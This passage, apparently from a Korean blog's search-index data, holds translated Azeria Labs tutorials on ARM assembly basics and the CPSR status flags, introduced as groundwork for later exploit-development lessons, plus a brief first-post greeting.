사용해서 ARM 바이너리를 디버깅 해 보면, 가끔 아래와 같은 플래그(Flags)를 볼 수 있습니다.\n레지스터 $cpsr는 현재 프로그램 상태 레지스터(Current Program Status Register, CPSR) 값을 보여주며, 해당 값을 통해 플래그 - thumb, fast, interrupt, overflow, carry, zero, negative - 를 확인할 수 있습니다. 이 플래그들은 CPSR 레지스터 내의 특정 위치의 비트 값을 통해 활성화 여부를 확인할 수 있습니다. N, Z, C, V 비트들은 x86에서 사용하는 EFLAG 레지스터의 SF, ZF, CF, OF 비트와 동일합니다. 이 비트들은 조건문 혹은 반복문을 어셈블리 레벨에서 서포트 해주는 역할을 합니다. 조건문 코드는 Part 6. 조건문 실행 및 분기 에서 다룰 예정입니다.\n위 사진은 32-bit CPSR 레지스터의 레이아웃을 표시하며, 왼쪽편이 최상위비트(most-significant-bits)이며 오른쪽이 최하위비트(least-significant-bits) 입니다. GE와 M 섹션 및 빈 공간 제외하고 모든 각각의 셀은 1비트 크기를 나타냅니다. 각각의 비트들은 현재 상태를 표현하는데 사용됩니다.\n   플래그 설명     N(Negative) 명령의 결과가 음수일 경우 활성화 됩니다.   Z(Zero) 명령의 결과가 0일경우 활성화 됩니다.   C(Carry) 명령의 결과를 표현하기 위해 33번째 비트가 필요할 경우 활성화 됩니다.   V(Overflow) 명령의 결과를 2의 보수인 32비트로 표현할 수 없을 경우 활성화 됩니다.   E(Endian-bit) ARM은 리틀엔디안이나 빅엔디안을 모두 사용할 수 있습니다. 0을 사용하면 리틀엔디안, 1을 사용하면 빅엔디안 모드입니다.   T(Thumb-bit) THUMB 상태이면 활성화 되며 ARM 상태이면 비활성화 됩니다.   M(Mode-bits) 권한상승모드(USR, SVC 등) 일 때 활성화 됩니다.   J(Jazelle) ARM 프로세서가 하드웨어에서 Java 바이트 코드를 실행하도록 허용할 경우 활성화 됩니다.    만약 우리가 CMP 명령을 통해 1과 2를 비교한다고 생각해 봅시다. 결과는 \u0026ldquo;마이너스(negative)\u0026rdquo; 일 것입니다 - 왜냐하면 1 - 2 = -1 이니까요. 우리가 동일한 숫자 두개를 비교할 때, 예를들면 2와 2를 비교한다고 가정해 보면, Z (Zero) 플래그가 설정됩니다. 왜냐하면 2 - 2 = 0 이기 때문이죠. 다만 CMP 명령에 사용되는 레지스터들은 수정할 수 없으며, CSPR이 각각의 레지스터를 비교한 결과를 스스로 수정한다는 사실을 명심하세요.\n이제 GDB에서(GEF가 설치 된 상태에서) 우리가 r1과 r0을 비교했을 때, r1=4이고 r0=2 일 때, 어떻게 보여지는지 확인해 보겠습니다. 실행 결과는 아래와 같습니다:\nCARRY 플래그가 설정된 것을 볼 수 있습니다. 왜냐하면 우리는 cmp r1, r0 명령을 통해 r1=4, r0=2를 비교했고, 4-2=2 이기 때문입니다. 이에 반해, negative 플래그(N)은 설정되지 않았는데 왜냐하면 큰 숫자(4)와 작은 숫자(2)를 비교했기 때문입니다. 만약 우리가 cmp r0, r1 명령을 사용했다면 negative 플래그가 활성화 되었을 것입니다.\n아래에 ARM Infocenter에 명시된 내용을 발췌해 보았습니다:\n N - 명령어 실행 결과가 음수일 때 활성화 Z - 명령어 실행 결과가 0일때 활성화 C - 명령어 실행 결과 캐리(carry)가 생길 경우 활성화 V - 명령어 실행 결과 오버플로우가 생길 경우 활성화  캐리가 생기는 경우는 아래와 같습니다:\n 덧셈을 한 결과값이 2^32 보다 크거나 같을 때 뺄셈을 한 결과값이 양수이거나 0일 때 move나 논리 명령 실행 중 실행된 인라인 배럴 시프터(inline barrel shifter) 명령의 결과  (참고) 인라인 베럴 시프터(inline barrel shifter) 명령이란?\n ARM 산술 논리 장치에는 시프트 및 회전 작업이 가능한 32 비트 배럴 시프터가 있습니다. 여러 ARM 및 Thumb 데이터 처리 및 단일 레지스터 데이터 전송 명령어에 대한 두 번째 피연산자는 데이터 처리 또는 데이터 전송이 명령어의 일부로 실행되기 전에 이동 될 수 있습니다. (참고) 복잡한 명령어들을 처리할 때 사용합니다.  오버플로우는 덧셈, 뺄셈, 비교의 결과값이 2^31 보다 같거나 혹은 크거나, -2^31보다 작을 때 발생합니다.\n","permalink":"https://deguru22.github.io/2021/08/22/arm-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%ED%8A%9C%ED%86%A0%EB%A6%AC%EC%96%BC-2-%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%83%80%EC%9E%85%EA%B3%BC-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0/","summary":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-2/)\n 데이터 타입들 하이레벨 언어들과 비슷하게, ARM은 다른 데이터타입에 대한 연산을 지원합니다. 우리가 불러오거나 저장할 수 있는 데이터 타입들은 부호가 없는 워드(unsigned words), 반 워드(half words), 혹은 바이트(bytes) 입니다. 이 데이터 타입들에 대해 붙는 전치사(익스텐션)들은: -h or -sh: halfwords, -b or -sb: bytes이며 워드(words)는 익스텐션이 없습니다. 부호가 있는(signed) 것과 없는(unsigned)것의 차이는 아래와 같습니다.\n 부호가 있는 데이터 타입들은 양수와 음수를 모두 저장할 수 있으므로, 표현할 수 있는 범위(range)가 적습니다.","title":"ARM 어셈블리 튜토리얼 (2) 데이터 타입과 레지스터"},{"content":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-1/)\n ARM Assembly Basics 튜토리얼 시리즈에 오신 여러분을 환영합니다! 이 문서는 ARM Exploit 개발 튜토리얼 전에 알아야 할 내용을 담고 있습니다. ARM 쉘코드를 작성하고 ROP 체인을 만들기 전에 ARM Assembly 기초에 대해서 알아야 합니다.\n아래 주제들을 순차적으로 다룰 예정입니다.\nARM Assembly 기본 튜토리얼 시리즈:\n Part 1. ARM Assembly 기본 Part 2. 데이터 타입 레지스터 Part 3. ARM 명령어 셋 Part 4. 메모리 명령들: 데이터 불러오기 및 저장하기 Part 5. 다중 불러오기 및 저장하기 Part 6. 조건부 실행 및 분기문 Part 7. 스택과 함수  튜토리얼을 이해하기 위해서는 ARM 기반의 테스트 베드(Lab Environment)가 필요합니다. 라즈베리파이와같은 ARM 기반의 기기가 없다면, VM에 QEMU와 라즈베리파이 디스트로를 이용하여 테스트 환경을 구축할 수 있습니다. 또한 GDB가 익숙하지 않다면 다른 튜토리얼을 통해서 미리 공부해 주새요. 이 튜토리얼에서는 ARM 32-bit 환경에 집중할 것이고, 예제들은 모두 ARMv6 기반으로 컴파일 되었습니다.\n왜 ARM 인가? 이 튜토리얼은 ARM Assembly의 기본을 가르치기 위해 작성했습니다. 특히 ARM 플랫폼에서 익스플로잇을 작성하고 싶은 사람들에게 유용할 것입니다. 당신은 이미 당신 곁에 많은 ARM 프로세서들이 존재한다는 사실을 알고 있을 것입니다. 내 주변을 돌아보면, 인텔 프로세서보다 훨씬 더 많은 ARM 프로세서를 확인할 수 있습니다. 스마트폰, 라우터, 요즘 잘 팔리는 IoT 기기 등에서 말이죠. 이 말인 즉슨, ARM 프로세서는 전 세계에서 가장 널리 보급된 CPU 코어 중 하나라고 할 수 있다는 것입니다. PC나 IoT 기기들이 부적절한 입력값 검증으로 인한 버퍼 오버플로우 등의 공격에 영향을 받기 쉽다는 사실을 생각해 본다면, 널리 퍼진 ARM 기반의 기기들은 다양한 오용 가능성 혹은 공격의 타겟이 될 가능성이 있으며 그 가능성은 점점 높아질 것입니다.\n아직 x86 전문가가 ARM 전문가보다 많지만, ARM 어셈블리 언어는 널리 알려진 어셈블리 언어 중 가장 쉽습니다. 그런데 왜 사람들은 ARM에 관심을 가지지 않을까요? 아마도 인텔 프로세서보다 ARM 프로세서 관련한 참고 문헌 들이 적기 때문일 수 있습니다. x86 프로세서를 생각해 보면, Fuzzy Security나 Corelan Team에서 쓴 매우 훌륭한 튜토리얼들이 떠오릅니다. 이러한 튜토리얼을 기반으로 사람들이 실무적인 지식을 가지게 되고, 나아가 튜토리얼에서 커버하지 못한 내용들도 알아내게 됩니다. 만약 당신이 x86 익스플로잇에 관심이 많다면 위 튜토리얼을 통해 훌륭한 시작을 할 수 있을 것입니다. 이 튜토리얼 에서는 어셈블리 기본과 ARM에서 익스플로잇 작성 방법을 집중적으로 다룰 것입니다.\nARM 프로세서 vs 인텔 프로세서 인텔과 ARM에는 많은 다른점이 있지만, 가장 중요한 다른점은 명령어 셋(instruction set) 입니다. 인텔은 CISC(Complex Instruction Set Computing) 프로세서로서 크고 다양한 기능을 가진 명령어 셋을 가지고 있어서, 복잡한 명령어를 통해 메모리 접근을 하게 됩니다. 그러므로 ARM에 비해 다양한 명령어, 어드레싱 모드를 가지고 있지만 더 적은 레지스터를 가지고 있습니다. CISC 방식은 요즘의 PC, 워크스테이션, 서버 등에서 사용되고 있습니다.\nARM은 RISC(Reduced Instruction Set Computing) 프로세서로서 단순한, 100개 혹은 그보다 적은 명령어 셋을 가지고 있습니다.인텔과 다르게 ARM의 명령어는 단순하게 레지스터를 관리하고 메모리에 기록 혹은 메모리로부터 값을 불러오는 역할 정도만 수행합니다. 이말인 즉슨 메모리에 접근 할 때 Load/Store 명령만 사용할 수 있다는 얘깁니다. 좀 더 구체화 시켜보면, ARM에 올라와 있는 특정 메모리 주소 32-bit 내의 값을 증가 시키기 위해서는 오직 세 가지의 명령어 (불러오기, 증가, 그리고 저장) 만 필요하다는 이야기 입니다. 값을 처음 메모리에서 레지스터로 불러오고, 레지스터 안에서 증가시킨 뒤, 다시 레지스터에서 메모리로 저장시키면 됩니다.\nReduced Instruction Set은 장점과 단점이 있습니다. 장점 중 하나는 명령이 빠르게 실행될 수 있다는 것이며, 전체적으로 더 빠른 속도를 제공할 수 있다는 점입니다(RISC 시스템은 명령 실행 시간 단축을 위해 각 명령 당 clock cycle을 줄입니다). 반면에 단점은 적은 명령셋을 제공하기 때문에 소프트웨어를 만들 때 더욱 효율적으로 설계해야 한다는 점입니다. 그리고 ARM은 두 가지 모드가 있다는 점을 명심해야 합니다. ARM 모드와 Thumb 모드가 있습니다. Thumb 모드는 2바이트 혹은 4바이트가 될 수 있습니다(상세한 내용은 Part 3: ARM Instruction Set 참고).\n더 많은 ARM과 x86의 차이점은 아래와 같습니다.\n ARM은 대부분의 명령들을 조건부 분기 실행에 사용할 수 있습니다. 인텔 x86과 x86-64 시리즈는 리틀 인디언 포맷을 사용합니다. ARM 아키텍쳐는 버전3 이전에는 리틀 인디언 포맷을 사용했습니다. 그 이후로는 ARM 프로세서는 혼용 인디언(BI-Endian)을 지원하며 Endianness를 변경할 수 있는 기능을 탑재하고 있습니다.  이것들이 유일한 인텔과 ARM의 차이는 아니며, ARM 버전 별로의 차이들도 있습니다. 이 튜토리얼은 어떻게 ARM이 동작 하는지를 보여주기 위하여 작성된 것이기 때문에 최대한 일반적(generic)인 내용으로 작성 되었습니다. 기본을 이해하게 된다면, 그 이후로 각각 ARM 버전별 미묘한 차이를 쉽게 배울 수 있을 것입니다. 이 튜토리얼에서는 32-bit ARMv6 (라즈베리파이 1) 기반으로 작성 되었으므로, 설명들도 모두 해당 버전을 기반으로 작성되었습니다.\nARM 버전 별 이름이 헷갈릴 수 있습니다. 아래를 참고하세요:\nARM Family\n어셈블리 작성하기 ARM 익스플로잇 개발을 시작하기 전에, 어셈블리 프로그래밍의 기본을 이해해야 합니다. 그 전에, 왜 우리는 ARM 어셈블리가 \u0026ldquo;일반적인\u0026rdquo; 프로그래밍 / 스크립팅 언어가 아님에도 불구하고 필요할까요? 우리가 리버스 엔지니어링을 하고 ARM 바이너리의 플로우를 이해하고, 우리만의 ARM 쉘코드를 작성하고, ARM ROP 체인을 만들고, ARM 앱을 디버깅 할 일이 없다면 배울 필요가 없죠.\n리버스 엔지니어링과 익스플로잇 개발을 위해서 어셈블리 언어에 대해 속속들이 알 필요는 없지만 \u0026ldquo;빅 픽쳐\u0026quot;는 이해하고 있어야 합니다. 이러한 기본기는 본 튜토리얼에서 다룰것입니다. 만약 더 깊게 알고싶다면 이 챕터 맨 아래의 링크들을 참고하세요.\n그렇다면, 어셈블리 언어란 정확하게 무엇일까요? 어셈블리 언어는 머신 코드의 상단에 있는 얇은 문법 레이어(thin syntax layer)로서, 컴퓨터가 알아듣는 바이너리 표현(머신 코드)을 인코딩 하여 보여주는 것입니다. 그러면 우리가 바로 기계 언어를 바로 쓰면 어떨까요? 음, 그렇다면 매우 고통스러울 것입니다. 우리 컴퓨터는 어셈블리 코드를 그대로 실행할 수 없습니다. 왜냐하면 기계어만 실행 가능하기 때문입니다. 우리는 어셈블리 코드를 기계어로 바꾸는 GNU 어셈블러인 GNU Binutils 프로젝트를 통해 *.s 확장자를 가진 소스코드를 처리할 것입니다.\n어셈블리를 *.s 확장자를 가진 파일로 작성 하였다면, 그것을 아래와 같이 as 명령어를 통해 변환 후 ld 명령을 통해 바이너리로 링크 시킬 수 있습니다.\n$ as program.s -o program.o # 어셈블리를 기계어로 $ ld program.o -o program # 기계어를 바이너리로 어셈블리의 내부에서 어셈블리 언어의 매우 아래에서부터 위까지 공부해봅시다. 매우 아래 레벨에는 우리는 기계 회로의 전기 신호가 있죠. 전류는 신호로 변환되어 두 개의 레벨로 나뉩니다 - 0 볼트를 \u0026ldquo;꺼짐\u0026rdquo;, 5 볼트를 \u0026ldquo;켜짐\u0026rdquo; 이라고 합시다. 왜냐하면 시각적으로는 회로가 정확하게 몇 볼트인지 알 수 없어서, 우리가 전류가 켜짐/꺼짐 상태임을 숫자 0과 1을 통해 나타내기 위함입니다. 그 후 0과 1을 컴퓨터 프로세서가 이해하는 가장 작은 단위인 기계어 형태로 표현합니다. 아래에 기계어로 작성한 명령어 예제입니다.\n1110 0001 1010 0000 0010 0000 0000 0001 여기까진 좋은데.. 저런 0과 1의 패턴이 어떤 뜻인지 기억하기 쉽지 않습니다. 그래서 우리는 니모닉(mnemonics)이라고 하는 0과 1의 바이너리 패턴을 이해하기 쉽도록 줄임말 형태를 사용하며, 이것이 각 기계어 명령어의 이름입니다. 이 프로그램은 어셈블리 언어 프로그램으로 불리며, 각 컴퓨터의 어셈블리 언어란 컴퓨터의 기계어를 니모닉의 집합으로 표현한 것을 말합니다. 그러므로, 어셈블리 언어는 인간이 컴퓨터를 프로그래밍 할 때 사용되는 가장 낮은 레벨의 언어입니다. 명령의 각 피연산자(operands)는 니모닉 다음에 옵니다. 아래의 예제를 참고해 주세요.\nMOV R2, R1 이제 우리는 어셈블리 프로그램이 니모닉 이라고 불리우는 언어적 정보의 집합으로 만들어 졌다는 것을 알았으며, 우리는 그것들을 기계어로 변환해야 한다는 사실을 알았습니다. 위에서 언급한 것 처럼 ARM 어셈블리의 경우에는 GNU Binutils 프로젝트에 포함되어 있는 as 명령어를 통해 기계어로 변환할 수 있으며, 이 과정을 어셈블링(assembling) 이라고 부릅니다.\n정리하면, 우리는 컴퓨터가 전기 신호의 존재 여부를 인식하도록 만들어 졌고, 우리는 다양한 신호의 집합을 0과 1(bits)의 집합으로 표현할 수 있다는 사실을 배웠습니다. 우리는 기계어(신호의 집합)를 사용해서 컴퓨터를 미리 설계된 방식으로 작동하도록 제어할 수 있습니다. 우리가 그러한 신호의 집합을 모두 외우고 있기 어려우므로, 줄임말인 니모닉(mnemonics)을 사용하여 각 작동 방식 별로 명령어(이름)를 부여했습니다. 니모닉의 집합을 컴퓨터의 어셈블리 언어라고 부르며 우리는 어셈블러 라고 불리는 프로그램을 사용해서 하이레벨 언어를 위해 컴파일러가 하는 것 처럼 니모닉의 집합을 컴퓨터가 이해할 수 있는 기계어로 변환합니다.\n더 자세히 알아보고 싶다면..  ARM 어셈블리의 회오리 투어(Whirlwind Tour)  https://www.coranac.com/tonc/text/asm.htm\n라즈베리파이의 ARM 어셈블러  http://thinkingeek.com/arm-assembler-raspberry-pi/\n 리버스 엔지니어링 실무: x86, x64, ARM, 윈도우즈 커널, 리버싱 도구, 난독화 (작성자: Bruce Dang, Alexandre Gazet, Elias Bachaalany and Sebastien Josse)\n  ARM 레퍼런스 메뉴얼\n  http://infocenter.arm.com/help/topic/com.arm.doc.dui0068b/index.html\n어셈블러 사용자 가이드  http://www.keil.com/support/man/docs/armasm/default.htm\n","permalink":"https://deguru22.github.io/2021/08/18/arm-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%ED%8A%9C%ED%86%A0%EB%A6%AC%EC%96%BC-1-%EA%B8%B0%EC%B4%88/","summary":"ARM Assembly에 대해 공부하던 중 좋은 글이 있어 번역 하였다.\n출처: Azeria Labs (https://azeria-labs.com/writing-arm-assembly-part-1/)\n ARM Assembly Basics 튜토리얼 시리즈에 오신 여러분을 환영합니다! 이 문서는 ARM Exploit 개발 튜토리얼 전에 알아야 할 내용을 담고 있습니다. ARM 쉘코드를 작성하고 ROP 체인을 만들기 전에 ARM Assembly 기초에 대해서 알아야 합니다.\n아래 주제들을 순차적으로 다룰 예정입니다.\nARM Assembly 기본 튜토리얼 시리즈:\n Part 1. ARM Assembly 기본 Part 2. 데이터 타입 레지스터 Part 3.","title":"ARM 어셈블리 튜토리얼 (1) 기초"},{"content":"첫 포스팅 👋 조금씩 꾸준히 화이팅!\n","permalink":"https://deguru22.github.io/2021/07/18/%EC%95%88%EB%85%95/","summary":"첫 포스팅 👋 조금씩 꾸준히 화이팅!","title":"안녕!"}]